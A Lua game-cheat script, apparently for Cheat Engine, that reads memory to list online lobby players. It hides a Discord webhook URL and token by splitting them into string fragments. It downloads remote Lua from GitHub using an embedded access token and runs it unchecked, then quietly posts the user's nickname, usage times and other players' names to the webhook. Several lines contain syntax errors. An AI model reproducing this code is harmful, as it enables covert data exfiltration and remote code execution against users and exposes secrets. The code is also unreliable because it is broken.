json = require("json")

function CodeLogUrl()
    local Encode = {}
    Encode[1] = "://"
    Encode[2] = "dis"
    Encode[3] = "cord"
    Encode[4] = ".com/"
    Encode[5] = "a"
    Encode[6] = "pi/"
    Encode[7] = "we"
    Encode[8] = "b"
    Encode[9] = "hoo"
    Encode[10] = "ks/"
    Encode[11] = "1098366411857997854/"
    Encode[12] = "WxbOso69kCRX3cB3SQ5ydgHwk3f"
    Encode[13] = "_FK3WCfaTmZj7Ug4bu32OWsrxIICPflU7Sr40w2A1"
    local Coder = "https"..Encode[1]..Encode[2]..Encode[3]..Encode[4]..Encode[5]..Encode[6]..Encode[7]..Encode[8]..Encode[9]..Encode[10]..Encode[11]..Encode[12]..Encode[13]
    return Coder
  end


function InitKersHTTP()
    http = getInternet()

    kers_url = ''
    Username = ''

    get_kers_url = 'https://raw.githubusercontent.com/MrTin0/Delta-App/main/kerslog.lua?token=GHSAT0AAAAAACCRLCUBI45TOPX2B4NX3AF2ZC64KQA'

    load(http.getURL(get_kers_url))()
end

function SendPack(DATA,DAY,TIME)
    local DataDay = ''
    local DataTime = ''
    if DAY ~= 0 then
      DataDay = " - "..(os.date("%x"))
    else
      DataDay = ""
    end
    if TIME ~= 0 then
      DataTime = " at "..(os.date("!%H:%M:%S"))
    else
      DataTime = ""
    end
    kers_url = Username.." - "..DATA..DataDay..DataTime
    http.postURL(CodeLogUrl(),"content="..kers_url)
  end

function SendKersLog()
    local details = {
    content = ""
    ebeds = {
        {
            title = "User: "..SCNick,
            description = "used KERS at "..(os.date("!%H:%M:%S")).." UTC".."\n",
            }
        }
    }

    local data = json.encode(details)
    http.postURL(CodeLogUrl(),"payload_json="..data.."&Content-Type=".."application/json")
end

function CheckLobbyParicipants()
    local CNetworkPlayerMgr = readPointer("PlayerCountPTR")
    local PlayerList = ""
    local count - 0

    for i = 0,32,1 do
        local CNetGamePlayer = readPointer(CNetworkPlayerMgr + oNumPlayers + (i * 8))
        if CNetGamePlayer then
            local CPlayerInfo = readPointer(CNetGamePlayer + pCNetPlayerInfo)
            if CPlayerInfo then
                local CPed = readPointer(CPlayerInfo + pCNetPed)
                if CPed or CPed == 0 then
                    local PName = readString(CPlayerInfo + oName)
                    PlayerList = PlayerList.." "..PName
                    count = count + 1
                end
            end
        end
    end

    if count >= 2 then
        SendPack(PlayerList, 0, 0)
    end
end
